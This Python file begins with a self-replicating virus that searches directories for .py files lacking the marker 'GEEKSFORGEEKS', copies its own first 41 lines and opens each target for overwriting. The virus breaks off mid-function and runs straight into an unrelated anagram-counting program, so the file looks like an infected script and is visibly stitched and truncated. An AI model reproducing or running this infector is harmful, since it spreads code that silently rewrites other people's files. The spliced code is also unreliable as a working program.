#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find minimum
# number of characters to be
# removed to make two strings
# anagram.

# function to calculate minimum
# numbers of characters to be
# removed to make two strings anagram
def makeAnagram(a, b):
	buffer = [0] * 26
	for char in a:
		buffer[ord(char) - ord('a')] += 1
	for char in b:
		buffer[ord(char) - ord('a')] -= 1
	return sum(map(abs, buffer))

# Driver Code
if __name__ == "__main__" :

	str1 = "bcadeh"
	str2 = "hea"
	print(makeAnagram(str1, str2))
	
# This code is contributed
# by Raghib Ahsan
